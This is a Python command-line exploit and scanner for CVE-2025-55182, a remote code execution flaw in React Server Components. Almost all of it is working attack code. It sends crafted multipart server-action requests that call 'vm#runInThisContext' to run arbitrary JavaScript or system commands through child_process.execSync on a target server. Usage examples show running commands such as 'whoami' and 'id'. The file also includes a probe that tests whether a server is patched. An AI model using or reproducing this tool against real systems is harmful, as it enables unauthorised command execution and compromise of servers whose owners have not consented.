#!/usr/bin/env python3
"""
CVE-2025-55182 - React Server Components RCE Exploit & Scanner
Supports external servers and CLI interface
"""

import argparse
import sys
import json
import urllib.request
import urllib.parse
from urllib.error import URLError, HTTPError

class CVE202555182Exploit:
    def __init__(self, target_url, endpoint='/formaction', timeout=10):
        """
        Initialize exploit
        
        Args:
            target_url: Target server URL (e.g., http://example.com:3002)
            endpoint: POST endpoint path (default: /formaction)
            timeout: Request timeout in seconds
        """
        self.target_url = target_url.rstrip('/')
        # Ensure endpoint starts with /
        if not endpoint.startswith('/'):
            endpoint = '/' + endpoint
        self.endpoint = f"{self.target_url}{endpoint}"
        self.timeout = timeout
        
    def create_multipart_form(self, fields):
        """Create multipart/form-data request body"""
        boundary = '----BoundaryCVE202555182'
        parts = []
        
        for name, value in fields.items():
            parts.append(f'--{boundary}\r\n')
            parts.append(f'Content-Disposition: form-data; name="{name}"\r\n\r\n')
            parts.append(f'{value}\r\n')
        
        parts.append(f'--{boundary}--\r\n')
        body = ''.join(parts).encode('utf-8')
        
        return body, boundary
    
    def send_exploit(self, command):
        """
        Send exploit to target server
        
        Args:
            command: Command to execute or JavaScript code
            
        Returns:
            dict: Execution result
        """
        # Build RCE payload
        if command.startswith('js:'):
            # Direct JavaScript code
            code = command[3:]
        else:
            # System command via child_process
            escaped_cmd = command.replace('"', '\\"').replace('\\', '\\\\')
            code = f'process.mainModule.require("child_process").execSync("{escaped_cmd}").toString()'
        
        payload = {
            '$ACTION_REF_0': '',
            '$ACTION_0:0': json.dumps({
                'id': 'vm#runInThisContext',
                'bound': [code]
            })
        }
        
        body, boundary = self.create_multipart_form(payload)
        
        try:
            req = urllib.request.Request(
                self.endpoint,
                data=body,
                headers={
                    'Content-Type': f'multipart/form-data; boundary={boundary}',
                    'Content-Length': str(len(body)),
                    'User-Agent': 'CVE-2025-55182-Exploit/1.0'
                }
            )
            
            with urllib.request.urlopen(req, timeout=self.timeout) as response:
                result = response.read().decode('utf-8')
                try:
                    return {'status': response.status, 'data': json.loads(result)}
                except json.JSONDecodeError:
                    return {'status': response.status, 'data': result}
                    
        except HTTPError as e:
            return {'status': e.code, 'error': str(e)}
        except URLError as e:
            return {'status': 0, 'error': f'Connection error: {str(e)}'}
        except Exception as e:
            return {'status': 0, 'error': str(e)}
    
    def check_vulnerability(self):
        """Check if server is vulnerable to prototype chain access (the actual CVE)"""
        print(f"[*] Checking vulnerability: {self.target_url}")
        
        # Test 1: Try prototype chain access (the actual vulnerability)
        # This should fail if patched (React 19.2.1+)
        boundary = '----BoundaryCVE202555182'
        payload = {
            '$ACTION_REF_0': '',
            '$ACTION_0:0': json.dumps({
                'id': 'vm#toString',  # toString is from Object.prototype (prototype chain)
                'bound': ['test']
            })
        }
        
        body, boundary = self.create_multipart_form(payload)
        try:
            req = urllib.request.Request(
                self.endpoint,
                data=body,
                headers={
                    'Content-Type': f'multipart/form-data; boundary={boundary}',
                    'Content-Length': str(len(body)),
                    'User-Agent': 'CVE-2025-55182-Exploit/1.0'
                }
            )
            with urllib.request.urlopen(req, timeout=self.timeout) as response:
                result_data = response.read().decode('utf-8')
                try:
                    data = json.loads(result_data)
                    if isinstance(data, dict) and data.get('success'):
                        print(f"[+] Server is VULNERABLE! (prototype chain access works)")
                        return True
                except:
                    pass
        except urllib.error.HTTPError as e:
            if e.code == 500:
                print(f"[+] Server is PATCHED! (prototype chain access blocked)")
                print(f"    React 19.2.1+ installed - CVE-2025-55182 fixed")
                return False
        
        # Test 2: Direct access (should work even if patched - real exports)
        result = self.send_exploit('js:1+1')
        if result.get('status') == 200:
            data = result.get('data', {})
            if isinstance(data, dict) and data.get('success') and data.get('result') == '2':
                print(f"[!] Direct access works (expected - real exports)")
                print(f"    But prototype chain access is blocked (patched)")
                return False
        
        print(f"[-] Unable to determine vulnerability status")
        return False
    
    def execute_command(self, command):
        """Execute command on vulnerable server"""
        print(f"[*] Executing command: {command}")
        result = self.send_exploit(command)
        
        if result.get('status') == 200:
            data = result.get('data', {})
            if isinstance(data, dict) and data.get('success'):
                output = data.get('result', '')
                print(f"[+] Result:\n{output}")
                return output
            else:
                print(f"[-] Execution error: {data}")
                return None
        else:
            print(f"[-] Request error: {result.get('error', 'Unknown')}")
            return None
    
    def execute_code(self, code):
        """Execute JavaScript code on vulnerable server"""
        print(f"[*] Executing code: {code}")
        result = self.send_exploit(f'js:{code}')
        
        if result.get('status') == 200:
            data = result.get('data', {})
            if isinstance(data, dict) and data.get('success'):
                output = data.get('result', '')
                print(f"[+] Result: {output}")
                return output
            else:
                print(f"[-] Execution error: {data}")
                return None
        else:
            print(f"[-] Request error: {result.get('error', 'Unknown')}")
            return None


def parse_args():
    """Parse command line arguments"""
    parser = argparse.ArgumentParser(
        description='CVE-2025-55182 - React Server Components RCE Exploit & Scanner',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Check vulnerability
  python3 exploit.py --ip 192.168.1.100 --port 3002 --check
  
  # Execute command
  python3 exploit.py --ip 192.168.1.100 --port 3002 --cmd "whoami"
  
  # Execute JavaScript code
  python3 exploit.py --url http://example.com:3002 --code "Math.PI * 2"
  
  # Use custom endpoint
  python3 exploit.py --ip 192.168.1.100 --port 3002 --post-endpoint "/api/v1/login" --cmd "whoami"
  
  # Use full URL
  python3 exploit.py --url http://target.com:3002/formaction --cmd "id"
        """
    )
    
    parser.add_argument('cve', nargs='?', default='CVE-2025-55182', 
                        help='CVE number (optional, default: CVE-2025-55182)')
    
    # Target selection group
    target_group = parser.add_mutually_exclusive_group(required=True)
    target_group.add_argument('--ip', help='Target server IP address')
    target_group.add_argument('--url', help='Full target server URL (e.g., http://example.com:3002)')
    
    parser.add_argument('--port', type=int, default=3002, help='Server port (default: 3002)')
    parser.add_argument('--post-endpoint', '--post_endpoint', dest='endpoint', default='/formaction', 
                        help='Custom POST endpoint path (default: /formaction). Examples: /formaction, /api/formaction, /api/v1/login')
    
    # Action selection group
    action_group = parser.add_mutually_exclusive_group(required=True)
    action_group.add_argument('--check', action='store_true', help='Check vulnerability')
    action_group.add_argument('--cmd', help='Execute system command')
    action_group.add_argument('--code', help='Execute JavaScript code')
    
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout in seconds (default: 10)')
    
    return parser.parse_args()


def main():
    args = parse_args()
    
    # CVE check
    if args.cve != 'CVE-2025-55182':
        print(f"[!] Warning: CVE {args.cve} specified, but exploit is for CVE-2025-55182")
    
    # Build URL
    if args.url:
        target_url = args.url.rstrip('/')
        # If endpoint is in URL, extract it
        if '/formaction' in target_url:
            target_url = target_url.replace('/formaction', '')
    else:
        # Use IP and port
        protocol = 'http'  # Can add https support
        target_url = f"{protocol}://{args.ip}:{args.port}"
    
    print("=" * 70)
    print("CVE-2025-55182 - React Server Components RCE Exploit")
    print("=" * 70)
    print(f"Target: {target_url}")
    print()
    
    # Create exploit object
    exploit = CVE202555182Exploit(target_url, endpoint=args.endpoint, timeout=args.timeout)
    
    # Execute action
    if args.check:
        vulnerable = exploit.check_vulnerability()
        sys.exit(0 if vulnerable else 1)
    elif args.cmd:
        result = exploit.execute_command(args.cmd)
        sys.exit(0 if result else 1)
    elif args.code:
        result = exploit.execute_code(args.code)
        sys.exit(0 if result else 1)


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Critical error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
